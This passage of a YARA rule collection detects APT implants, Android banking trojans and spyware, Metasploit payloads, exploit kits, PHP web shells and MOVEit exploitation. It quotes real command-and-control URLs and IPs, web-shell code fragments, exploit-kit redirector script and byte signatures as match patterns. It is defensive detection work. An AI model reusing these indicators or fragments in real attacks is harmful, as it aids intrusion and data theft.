		reference3 = "https://www.virustotal.com/#/file/d135f03b9fdc709651ac9d0264e155c5580b072577a8ff24c90183b126b5e12a/"
		date = "2018-09-18"
		maltype1 = "Botnet"
		filetype = "memory"

	strings:
		$a = "GUID="	ascii
                $b = "&BUILD="	ascii
                $c = "&INFO="	ascii
                $d = "&IP="	ascii
                $e = "&TYPE=" 	ascii
                $f = "php|http"	ascii
		$g = "GUID=%I64u&BUILD=%s&INFO=%s&IP=%s&TYPE=1&WIN=%d.%d" ascii fullword


	condition:
		5 of ($a,$b,$c,$d,$e,$f) or $g

}

rule Unidentified_Malware_Two {
   meta:
      description = "Unidentified Implant by APT29"
      author = "US CERT"
      reference = "https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE"
      date = "2017-02-10"
      score = 85
   strings:
      $my_string_one = "/zapoy/gate.php"
      $my_string_two = { E3 40 FE 45 FD 0F B6 45 FD 0F B6 14 38 88 55 FF 00 55
         FC 0F B6 45 FC 8A 14 38 88 55 FE 0F B6 45 FD 88 14 38 0F B6 45 FC 8A
         55 FF 88 14 38 8A 55 FF 02 55 FE 8A 14 3A 8B 45 F8 30 14 30 }
      $my_string_three = "S:\\Lidstone\\renewing\\HA\\disable\\In.pdb"
      $my_string_four = { 8B CF 0F AF CE 8B C6 99 2B C2 8B 55 08 D1 F8 03 C8
         8B 45 FC 03 C2 89 45 10 8A 00 2B CB 32 C1 85 DB 74 07 }
      $my_string_five = "fuckyou1"
      $my_string_six = "xtool.exe"
   condition:
      ($my_string_one and $my_string_two)
      or ($my_string_three or $my_string_four)
      or ($my_string_five and $my_string_six)
}

rule HKTL_NET_NAME_aspnetcore_bypassing_authentication {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/jackowild/aspnetcore-bypassing-authentication"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "aspnetcore-bypassing-authentication" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule HKTL_NET_NAME_metasploit_sharp {
    meta:
        description = "Detects .NET red/black-team tools via name"
        reference = "https://github.com/VolatileMindsLLC/metasploit-sharp"
        author = "Arnim Rupp"
        date = "2021-01-22"
    strings:
        $name = "metasploit-sharp" ascii wide
        $compile = "AssemblyTitle" ascii wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them
}

rule Dendroid : android
{
	meta:
	author = "https://twitter.com/jsmesa"
	reference = "https://koodous.com/"
	description = "Dendroid RAT"
	strings:
    	$s1 = "/upload-pictures.php?"
    	$s2 = "Opened Dialog:"
    	$s3 = "com/connect/MyService"
    	$s4 = "android/os/Binder"
    	$s5 = "android/app/Service"
   	condition:
    	all of them

}

rule Trojan_Dendroid
{
meta:
author = "https://www.twitter.com/SadFud75"
description = "Detection of dendroid trojan"
strings:
$s1 = "/upload-pictures.php?"
$s2 = "/get-functions.php?"
$s3 = "/new-upload.php?"
$s4 = "/message.php?"
$s5 = "/get.php?"
condition:
3 of them
}

rule Metasploit_Payload
{
meta:
author = "https://www.twitter.com/SadFud75"
information = "Detection of payloads generated with metasploit"
strings:
$s1 = "-com.metasploit.meterpreter.AndroidMeterpreter"
$s2 = ",Lcom/metasploit/stage/MainBroadcastReceiver;"
$s3 = "#Lcom/metasploit/stage/MainActivity;"
$s4 = "Lcom/metasploit/stage/Payload;"
$s5 = "Lcom/metasploit/stage/a;"
$s6 = "Lcom/metasploit/stage/c;"
$s7 = "Lcom/metasploit/stage/b;"
condition:
androguard.package_name("com.metasploit.stage") or any of them
}

rule Android_Malware : iBanking android
{
	meta:
		author = "Xylitol xylitol@malwareint.com"
		date = "2014-02-14"
		description = "Match first two bytes, files and string present in iBanking"
		reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3166"
		
	strings:
		// Generic android
		$pk = {50 4B}
		$file1 = "AndroidManifest.xml"
		// iBanking related
		$file2 = "res/drawable-xxhdpi/ok_btn.jpg"
		$string1 = "bot_id"
		$string2 = "type_password2"
	condition:
		($pk at 0 and 2 of ($file*) and ($string1 or $string2))
}

rule spyAgent
{
	meta:
		description = "This rule detects arabian spyware which records call and gathers user information which is later sent to a remote c&c"
		sample = "7cbf61fbb31c26530cafb46282f5c90bc10fe5c724442b8d1a0b87a8125204cb"
		reference = "https://blogs.mcafee.com/mcafee-labs/android-spyware-targets-security-job-seekers-in-saudi-arabia/"
		author = "@koodous_project"

	strings:
		$phone = "0597794205"
		$caption = "New victim arrived"
		$cc = "http://ksa-sef.com/Hack%20Mobaile/ADDNewSMS.php"
		$cc_alt = "http://ksa-sef.com/Hack%20Mobaile/AddAllLogCall.php"
		$cc_alt2= "http://ksa-sef.com/Hack%20Mobaile/addScreenShot.php"
		$cc_alt3= "http://ksa-sef.com/Hack%20Mobaile/ADDSMS.php"
		$cc_alt4 = "http://ksa-sef.com/Hack%20Mobaile/ADDVCF.php"
		$cc_alt5 = "http://ksa-sef.com/Hack%20Mobaile/ADDIMSI.php"
		$cc_alt6 = "http://ksa-sef.com/Hack%20Mobaile/ADDHISTORYINTERNET.php"
		$cc_alt7 = "http://ksa-sef.com/Hack%20Mobaile/addInconingLogs.php"

	condition:
		androguard.url(/ksa-sef\.com/) or ($phone and $caption) or ($cc and $cc_alt and $cc_alt2 and $cc_alt3 and $cc_alt4 and $cc_alt5 and $cc_alt6 and $cc_alt7)
		
}

rule Banker_Acecard
{
meta:
author = "https://twitter.com/SadFud75"
more_information = "https://threats.kaspersky.com/en/threat/Trojan-Banker.AndroidOS.Acecard/"
samples_sha1 = "ad9fff7fd019cf2a2684db650ea542fdeaaeaebb 53cca0a642d2f120dea289d4c7bd0d644a121252"
strings:
$str_1 = "Cardholder name"
$str_2 = "instagram.php"
condition:
((androguard.package_name("starter.fl") and androguard.service("starter.CosmetiqFlServicesCallHeadlessSmsSendService")) or androguard.package_name("cosmetiq.fl") or all of ($str_*)) and androguard.permissions_number > 19
}

rule android_meterpreter : android
{
    meta:
        author="73mp74710n"
        ref = "https://github.com/zombieleet/yara-rules/blob/master/android_metasploit.yar"
        comment="Metasploit Android Meterpreter Payload"
        
    strings:
	$checkPK = "META-INF/PK"
	$checkHp = "[Hp^"
	$checkSdeEncode = /;.Sk/
	$stopEval = "eval"
	$stopBase64 = "base64_decode"
	
    condition:
	any of ($check*) or any of ($stop*)
}

rule android_metasploit : android
{
	meta:
		author = "https://twitter.com/plutec_net"
		description = "This rule detects apps made with metasploit framework"
		sample = "cb9a217032620c63b85a58dde0f9493f69e4bda1e12b180047407c15ee491b41"

	strings:
		$a = "*Lcom/metasploit/stage/PayloadTrustManager;"
		$b = "(com.metasploit.stage.PayloadTrustManager"
		$c = "Lcom/metasploit/stage/Payload$1;"
		$d = "Lcom/metasploit/stage/Payload;"

	condition:
		all of them
		
}

rule Android_Clicker_G
{
	meta:
		author = "Jacob Soo Lead Re"
		date = "01-July-2016"
		description = "This rule try to detects Clicker.G samples"
		reference = "https://blogs.mcafee.com/mcafee-labs/android-malware-clicker-dgen-found-google-play/"
	strings:
		$a = "upd.php?text="
	condition:
		androguard.receiver(/MyBroadCastReceiver/i) and $a
}

rule cve_2013_0074
{
meta:
	author = "Kaspersky Lab"
	filetype = "Win32 EXE"
	date = "2015-07-23"
	version = "1.0"

strings:
	$b2="Can't find Payload() address" ascii wide
	$b3="/SilverApp1;component/App.xaml" ascii wide
	$b4="Can't allocate ums after buf[]" ascii wide
	$b5="------------ START ------------"

condition:
	( (2 of ($b*)) )
}

rule phoenix_html4 : EK
{
meta:
   author = "Josh Berry"
   date = "2016-06-26"
   description = "Phoenix Exploit Kit Detection"
   hash0 = "61fde003211ac83c2884fbecefe1fc80"
   sample_filetype = "js-html"
   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
   $string0 = "/dr.php"
   $string1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   $string2 = "launchjnlp"
   $string3 = "clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA"
   $string4 = "urlmon.dll"
   $string5 = "<body>"
   $string6 = " docbase"
   $string7 = "</html>"
   $string8 = " classid"
   $string9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   $string10 = "63AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   $string11 = "</object>"
   $string12 = "application/x-java-applet"
   $string13 = "java_obj"
condition:
   13 of them
}

rule AnglerEKredirector : EK
{
   meta:
      description = "Angler Exploit Kit Redirector"
      ref = "http://blog.xanda.org/2015/08/28/yara-rule-for-angler-ek-redirector-js/"
      author = "adnan.shukor@gmail.com"
      date = "08-July-2015"
      impact = "5"
      version = "1"
   strings:
      $ekr1 = "<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000);" fullword
      $ekr2 = "document.cookie=\"PHP_SESSION_PHP="
      $ekr3 = "path=/; expires=\"+date.toUTCString();</script>" fullword
      $ekr4 = "<iframe src=" fullword
      $ekr5 = "</iframe></div>" fullword
   condition:
      all of them
}

rule blackhole_basic :  EK
{
    strings:
        $a = /\.php\?.*?\:[a-zA-Z0-9\:]{6,}?\&.*?\&/
    condition:
        $a
}

rule blackhole2_htm : EK
{
meta:
   author = "Josh Berry"
   date = "2016-06-27"
   description = "BlackHole2 Exploit Kit Detection"
   hash0 = "92e21e491a90e24083449fd906515684"
   hash1 = "98b302a504a7ad0e3515ab6b96d623f9"
   hash2 = "a91d885ef4c4a0d16c88b956db9c6f43"
   hash3 = "d8336f7ae9b3a4db69317aea105f49be"
   hash4 = "eba5daf0442dff5b249274c99552177b"
   hash5 = "02d8e6daef5a4723621c25cfb766a23d"
   hash6 = "dadf69ce2124283a59107708ffa9c900"
   hash7 = "467199178ac940ca311896c7d116954f"
   hash8 = "17ab5b85f2e1f2b5da436555ea94f859"
   sample_filetype = "js-html"
   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
   $string0 = ">links/</a></td><td align"
   $string1 = ">684K</td><td>"
   $string2 = "> 36K</td><td>"
   $string3 = "move_logs.php"
   $string4 = "files/"
   $string5 = "cron_updatetor.php"
   $string6 = ">12-Sep-2012 23:45  </td><td align"
   $string7 = ">  - </td><td>"
   $string8 = "cron_check.php"
   $string9 = "-//W3C//DTD HTML 3.2 Final//EN"
   $string10 = "bhadmin.php"
   $string11 = ">21-Sep-2012 15:25  </td><td align"
   $string12 = ">data/</a></td><td align"
   $string13 = ">3.3K</td><td>"
   $string14 = "cron_update.php"
condition:
   14 of them
}

rule blackhole2_htm3 : EK
{
meta:
   author = "Josh Berry"
   date = "2016-06-27"
   description = "BlackHole2 Exploit Kit Detection"
   hash0 = "018ef031bc68484587eafeefa66c7082"
   sample_filetype = "js-html"
   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
   $string0 = "/download.php"
   $string1 = "./files/fdc7aaf4a3 md5 is 3169969e91f5fe5446909bbab6e14d5d"
   $string2 = "321e774d81b2c3ae"
   $string3 = "/files/new00010/554-0002.exe md5 is 8a497cf4ffa8a173a7ac75f0de1f8d8b"
   $string4 = "./files/3fa7bdd7dc md5 is 8a497cf4ffa8a173a7ac75f0de1f8d8b"
   $string5 = "1603256636530120915 md5 is 425ebdfcf03045917d90878d264773d2"
condition:
   3 of them
}

rule blackhole2_htm4 : EK
{
meta:
   author = "Josh Berry"
   date = "2016-06-27"
   description = "BlackHole2 Exploit Kit Detection"
   hash0 = "926429bf5fe1fbd531eb100fc6e53524"
   hash1 = "7b6cdc67077fc3ca75a54dea0833afe3"
   hash2 = "82f108d4e6f997f8fc4cc02aad02629a"
   hash3 = "bd819c3714dffb5d4988d2f19d571918"
   hash4 = "9bc9f925f60bd8a7b632ae3a6147cb9e"
   hash0 = "926429bf5fe1fbd531eb100fc6e53524"
   hash2 = "82f108d4e6f997f8fc4cc02aad02629a"
   hash7 = "386cb76d46b281778c8c54ac001d72dc"
   hash8 = "0d95c666ea5d5c28fca5381bd54304b3"
   sample_filetype = "js-html"
   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
   $string0 = "words.dat"
   $string1 = "/icons/back.gif"
   $string2 = "data.dat"
   $string3 = "files.php"
   $string4 = "js.php"
   $string5 = "template.php"
   $string6 = "kcaptcha"
   $string7 = "/icons/blank.gif"
   $string8 = "java.dat"
condition:
   8 of them
}

rule blackhole2_htm5 : EK
{
meta:
   author = "Josh Berry"
   date = "2016-06-27"
   description = "BlackHole2 Exploit Kit Detection"
   hash0 = "fccb8f71663620a5a8b53dcfb396cfb5"
   hash1 = "a09bcf1a1bdabe4e6e7e52e7f8898012"
   hash2 = "40db66bf212dd953a169752ba9349c6a"
   hash3 = "25a87e6da4baa57a9d6a2cdcb2d43249"
   hash4 = "6f4c64a1293c03c9f881a4ef4e1491b3"
   hash0 = "fccb8f71663620a5a8b53dcfb396cfb5"
   hash2 = "40db66bf212dd953a169752ba9349c6a"
   hash7 = "4bdfff8de0bb5ea2d623333a4a82c7f9"
   hash8 = "b43b6a1897c2956c2a0c9407b74c4232"
   sample_filetype = "js-html"
   yaragenerator = "https://github.com/Xen0ph0n/YaraGenerator"
strings:
   $string0 = "ruleEdit.php"
   $string1 = "domains.php"
   $string2 = "menu.php"
   $string3 = "browsers_stat.php"
   $string4 = "Index of /library/templates"
   $string5 = "/icons/unknown.gif"
   $string6 = "browsers_bstat.php"
   $string7 = "oses_stat.php"
   $string8 = "exploits_bstat.php"
   $string9 = "block_config.php"
   $string10 = "threads_bstat.php"
   $string11 = "browsers_bstat.php"
   $string12 = "settings.php"
condition:
   12 of them
}

rule ASProtectvIfyouknowthisversionpostonPEiDboardh2
{
      meta:
		author="malware-lu"
strings:
		$a0 = { 90 60 E8 03 00 00 00 E9 EB 04 5D 45 55 C3 E8 01 00 00 00 EB 5D BB ED FF FF FF 03 DD 81 EB 00 [2] 00 80 7D 4D 01 75 0C 8B 74 24 28 83 FE 01 89 5D 4E 75 31 8D 45 53 50 53 FF B5 DD 09 00 00 8D 45 35 50 E9 82 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }

condition:
		$a0
}

rule ASProtectSKE21xexeAlexeySolodovnikov
{
      meta:
		author="malware-lu"
strings:
		$a0 = { 90 60 E8 03 00 00 00 E9 EB 04 5D 45 55 C3 E8 01 00 00 00 EB 5D BB ED FF FF FF 03 DD 81 EB 00 [3] 80 7D 4D 01 75 0C 8B 74 24 28 83 FE 01 89 5D 4E 75 31 8D 45 53 50 53 FF B5 ED 09 00 00 8D 45 35 50 E9 82 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }

condition:
		$a0
}

rule ASProtectv12AlexeySolodovnikovh1
{
      meta:
		author="malware-lu"
strings:
		$a0 = { 90 60 E8 1B 00 00 00 E9 FC 8D B5 0F 06 00 00 8B FE B9 97 00 00 00 AD 35 78 56 34 12 AB 49 75 F6 EB 04 5D 45 55 C3 E9 [3] 00 }

condition:
		$a0
}

rule ASProtectv20
{
      meta:
		author="malware-lu"
strings:
		$a0 = { 68 01 ?? 40 00 E8 01 00 00 00 C3 C3 }

condition:
		$a0
}

rule ASProtectv123RC4build0807exeAlexeySolodovnikov
{
      meta:
		author="malware-lu"
strings:
		$a0 = { 90 60 E8 03 00 00 00 E9 EB 04 5D 45 55 C3 E8 01 00 00 00 EB 5D BB ED FF FF FF 03 DD 81 EB [4] 80 7D 4D 01 75 0C 8B 74 24 28 83 FE 01 89 5D 4E 75 31 8D 45 53 50 53 FF B5 D5 09 00 00 8D 45 35 50 E9 82 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 }

condition:
		$a0
}

rule Joomla_cve_2023_23752_exploit_detection
{
  meta:
    author      = "Tenbite @https://x.com/BitOfTen"
    date        = "2025/01/09"
    description = "Detects CVE-2023-23752 Joomla exploit based on the PoC provided here - https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT/blob/main/CVE-2023-23752.py"

  strings:
    $vulnPathUsers        = /GET\s+\/api\/index\.php\/v1\/users\?public=true[^\r\n]*\s200\s/
    $vulnPathPasswords    = /GET\s+\/api\/index\.php\/v1\/config\/application\?public=true[^\r\n]*\s200\s/
  condition:
	($vulnPathUsers or $vulnPathPasswords)
}

rule SUSP_ELF_SPARC_Hunting_SBZ_UniqueStrings {
   meta:
      description = "This rule is UNTESTED against a large dataset and is for hunting purposes only."
      author = "netadr, modified by Florian Roth for performance reasons"
      reference = "https://netadr.github.io/blog/a-quick-glimpse-sbz/"
      date = "2023-04-02"
      modified = "2023-05-08"
      score = 60

      id = "d2f70d10-412e-5e83-ba4f-eac251012dc1"
   strings:
      $s1 = "<%u>[%s] Event #%u: "
      /* $s2 = "ofn" */
      $s2 = "lprc:%08X" ascii fullword

      // suggested by https://twitter.com/adulau/status/1553401532514766848
      $s3 = "diuXxobB" 
      $s4 = "CHM_FW"

   condition:
      2 of ($*)
}

rule STUXSHOP_config {
   meta:
      desc = "Stuxshop standalone sample configuration"
      author = "JAG-S (turla@chronicle.security)"
      hash = "c1961e54d60e34bbec397c9120564e8d08f2f243ae349d2fb20f736510716579"
      reference = "https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0"
      id = "67367db5-51b3-5177-960a-5b06161154e2"
   strings:
      $cnc1 = "http://211.24.237.226/index.php?data=" ascii wide
      $cnc2 = "http://todaysfutbol.com/index.php?data=" ascii wide
      $cnc3 = "http://78.111.169.146/index.php?data=" ascii wide
      $cnc4 = "http://mypremierfutbol.com/index.php?data=" ascii wide
      $regkey1 = "Software\\Microsoft\\Windows\\CurrentVersion\\MS-DOS Emulation" ascii wide
      $regkey2 = "NTVDMParams" ascii wide

      $flowerOverlap1 = { 85 C0 75 3B 57 FF 75 1C FF 75 18 FF 75 14 50 FF 75 10 FF 75 FC FF 15 }
      $flowerOverlap2 = { 85 C0 75 4C 8B 45 1C 89 45 0C 8D 45 0C 50 8D 45 08 FF 75 18 50 6A 00 FF 75 10 FF 75 20 FF 15 }
      $flowerOverlap3 = { 55 8B EC 53 56 8B 75 20 85 F6 74 03 83 26 00 8D 45 20 50 68 19 00 02 00 6A 00 FF 75 0C FF 75 08 }
      $flowerOverlap4 = { 55 8B EC 51 8D 4D FC 33 C0 51 50 6A 26 50 89 45 FC FF 15 }
      $flowerOverlap5 = { 85 DB 74 04 8B C3 EB 1A 8B 45 08 3B 45 14 74 07 B8 5D 06 00 00 EB 0B 85 F6 74 05 8B 45 0C 89 06 }
      $flowerOverlap6 = { 85 FF 74 12 83 7D F8 01 75 0C FF 75 0C FF 75 08 FF 15 }

   condition:
      all of ($flowerOverlap*)
      or
      2 of ($cnc*)
      or
      all of ($regkey*)
}

rule SUSP_ASPX_PossibleDropperArtifact_Aug21 {
   meta:
      description = "Detects an ASPX file with a non-ASCII header, often a result of MS Exchange drop techniques"
      reference = "Internal Research"
      author = "Max Altgelt"
      date = "2021-08-23"
      score = 60
      id = "52016598-74a1-53d6-812a-40b078ba0bb9"
   strings:
      $s1 = "Page Language=" ascii nocase

      $fp1 = "Page Language=\"java\"" ascii nocase
   condition:
      filesize < 500KB
      and not uint16(0) == 0x4B50 and not uint16(0) == 0x6152 and not uint16(0) == 0x8b1f // Exclude ZIP / RAR / GZIP files (can cause FPs when uncompressed)
      and not uint16(0) == 0x5A4D // PE
      and not uint16(0) == 0xCFD0 // OLE
      and not uint16(0) == 0xC3D4 // PCAP
      and not uint16(0) == 0x534D // CAB
      and all of ($s*) and not 1 of ($fp*) and
      (
         ((uint8(0) < 0x20 or uint8(0) > 0x7E /*non-ASCII*/ ) and uint8(0) != 0x9 /* tab */ and uint8(0) != 0x0D /* carriage return */ and uint8(0) != 0x0A /* new line */ and uint8(0) != 0xEF /* BOM UTF-8 */)
         or ((uint8(1) < 0x20 or uint8(1) > 0x7E /*non-ASCII*/ ) and uint8(1) != 0x9 /* tab */ and uint8(1) != 0x0D /* carriage return */ and uint8(1) != 0x0A /* new line */ and uint8(1) != 0xBB /* BOM UTF-8 */)
         or ((uint8(2) < 0x20 or uint8(2) > 0x7E /*non-ASCII*/ ) and uint8(2) != 0x9 /* tab */ and uint8(2) != 0x0D /* carriage return */ and uint8(2) != 0x0A /* new line */ and uint8(2) != 0xBF /* BOM UTF-8 */)
         or ((uint8(3) < 0x20 or uint8(3) > 0x7E /*non-ASCII*/ ) and uint8(3) != 0x9 /* tab */ and uint8(3) != 0x0D /* carriage return */ and uint8(3) != 0x0A /* new line */)
         or ((uint8(4) < 0x20 or uint8(4) > 0x7E /*non-ASCII*/ ) and uint8(4) != 0x9 /* tab */ and uint8(4) != 0x0D /* carriage return */ and uint8(4) != 0x0A /* new line */)
         or ((uint8(5) < 0x20 or uint8(5) > 0x7E /*non-ASCII*/ ) and uint8(5) != 0x9 /* tab */ and uint8(5) != 0x0D /* carriage return */ and uint8(5) != 0x0A /* new line */)
         or ((uint8(6) < 0x20 or uint8(6) > 0x7E /*non-ASCII*/ ) and uint8(6) != 0x9 /* tab */ and uint8(6) != 0x0D /* carriage return */ and uint8(6) != 0x0A /* new line */)
         or ((uint8(7) < 0x20 or uint8(7) > 0x7E /*non-ASCII*/ ) and uint8(7) != 0x9 /* tab */ and uint8(7) != 0x0D /* carriage return */ and uint8(7) != 0x0A /* new line */)
      )
}

rule APT_Lazarus_RAT_Jun18_1 {
   meta:
      description = "Detects Lazarus Group RAT"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://twitter.com/DrunkBinary/status/1002587521073721346"
      date = "2018-06-01"
      hash1 = "c10363059c57c52501c01f85e3bb43533ccc639f0ea57f43bae5736a8e7a9bc8"
      hash2 = "e98991cdd9ddd30adf490673c67a4f8241993f26810da09b52d8748c6160a292"
      id = "fd394d15-70c5-543a-a845-2058f296b5f8"
   strings:
      $a1 = "www.marmarademo.com/include/extend.php" fullword ascii
      $a2 = "www.33cow.com/include/control.php" fullword ascii
      $a3 = "www.97nb.net/include/arc.sglistview.php" fullword ascii

      $c1 = "Content-Disposition: form-data; name=\"file1\"; filename=\"example.dat\"" fullword ascii
      $c2 = "Content-Disposition: form-data; name=\"file1\"; filename=\"pratice.pdf\"" fullword ascii
      $c3 = "Content-Disposition: form-data; name=\"file1\"; filename=\"happy.pdf\"" fullword ascii
      $c4 = "Content-Disposition: form-data; name=\"file1\"; filename=\"my.doc\"" fullword ascii
      $c5 = "Content-Disposition: form-data; name=\"board_id\"" fullword ascii

      $s1 = "Winhttp.dll" fullword ascii
      $s2 = "Wsock32.dll" fullword ascii
      $s3 = "WM*.tmp" fullword ascii
      $s4 = "FM*.tmp" fullword ascii
      $s5 = "Cache-Control: max-age=0" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and (
         1 of ($a*) or
         2 of ($c*) or
         4 of them
      )
}

rule sql_php_php {
	meta:
		description = "Semi-Auto-generated  - file sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8334249cbb969f2d33d678fec2b680c5"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
	strings:
		$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
		$s2 = "http://rst.void.ru"
		$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
	condition:
		1 of them
		and not uint32(0) == 0x6D783F3C /* <?xm */
}

rule telnet_cgi {
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dee697481383052980c20c48de1598d1"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
	condition:
		1 of them
}

rule _1_c2007_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
	condition:
		1 of them
}

rule _r577_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
	condition:
		1 of them
}

rule _r577_php_php_r57_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword
	condition:
		1 of them
}

rule APT_lazaruswannacry {
   meta:
      description = "Rule based on shared code between Feb 2017 Wannacry sample and Lazarus backdoor from Feb 2015 discovered by Neel Mehta"
      date = "2017-05-15"
      reference = "https://twitter.com/neelmehta/status/864164081116225536"
      author = "Costin G. Raiu, Kaspersky Lab"
      version = "1.0"
      hash = "9c7c7149387a1c79679a87dd1ba755bc"
      hash = "ac21c8ad899727137c4b94458d7aa8d8"
      id = "e9dd9750-2366-503a-a879-972dbead6bf3"
   strings:
      $a1 = { 51 53 55 8B 6C 24 10 56 57 6A 20 8B 45 00 8D 75
         04 24 01 0C 01 46 89 45 00 C6 46 FF 03 C6 06 01 46
         56 E8 }
      $a2 = { 03 00 04 00 05 00 06 00 08 00 09 00 0A 00 0D 00
         10 00 11 00 12 00 13 00 14 00 15 00 16 00 2F 00
         30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00
         38 00 39 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00
         44 00 45 00 46 00 62 00 63 00 64 00 66 00 67 00
         68 00 69 00 6A 00 6B 00 84 00 87 00 88 00 96 00
         FF 00 01 C0 02 C0 03 C0 04 C0 05 C0 06 C0 07 C0
         08 C0 09 C0 0A C0 0B C0 0C C0 0D C0 0E C0 0F C0
         10 C0 11 C0 12 C0 13 C0 14 C0 23 C0 24 C0 27 C0
         2B C0 2C C0 FF FE }
   condition:
      uint16(0) == 0x5A4D and filesize < 15000000 and all of them
}

rule VULN_PHP_Hack_Backdoored_Zlib_Zerodium_Mar21_1 {
   meta:
      description = "Detects backdoored PHP zlib version"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/"
      date = "2021-03-29"
      id = "5e0ab8f8-776a-52b0-b5be-ff1d34bccfd1"
   strings:
      $x1 = "REMOVETHIS: sold to zerodium, mid 2017" fullword ascii
      $x2 = "HTTP_USER_AGENTT" ascii fullword
   condition:
      filesize < 3000KB and
      all of them
}

rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_1 {
   meta:
      description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
      author = "Florian Roth"
      reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
      date = "2023-06-01"
      score = 70
      id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
   strings:
      $x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
      $x2 = " GET /human2.aspx - 443 " ascii
   condition:
      1 of them
}

rule LOG_EXPL_MOVEit_Exploitation_Indicator_Jun23_2 {
   meta:
      description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
      author = "Florian Roth"
      reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
      date = "2023-06-03"
      score = 70
      id = "1527f5e3-071d-5152-9452-9c4472d258f2"
   strings:
      $a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
